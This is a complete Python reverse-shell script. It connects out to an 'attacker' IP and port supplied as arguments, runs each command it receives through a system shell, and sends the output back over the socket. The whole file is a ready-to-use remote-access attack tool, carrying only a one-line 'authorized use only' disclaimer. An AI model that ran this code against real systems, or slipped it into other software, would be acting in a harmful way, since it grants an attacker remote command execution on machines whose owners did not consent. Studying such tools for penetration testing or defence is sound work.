import socket
import subprocess

def shell(attacker_ip, attacker_port):
    """
    Connects to the attacker's IP and port, and provides a shell.
    Only use on systems you own or have explicit permission to test.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        s.send(b"[+] Connection established!\n")
        while True:
            data = s.recv(1024)
            if not data:
                break
            cmd = data.decode().strip()
            if cmd.lower() in ("exit", "quit"):
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e).encode()
            if not output:
                output = b"[+] Command executed, but no output.\n"
            s.send(output)
        s.close()
    except Exception as e:
        # Optionally log or print the error for debugging
        print(f"Reverse shell error: {e}")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Python Reverse Shell (for authorized use only!)")
    parser.add_argument("attacker_ip", help="Attacker/listener IP address")
    parser.add_argument("attacker_port", type=int, help="Attacker/listener port")
    args = parser.parse_args()

    shell(args.attacker_ip, args.attacker_port)
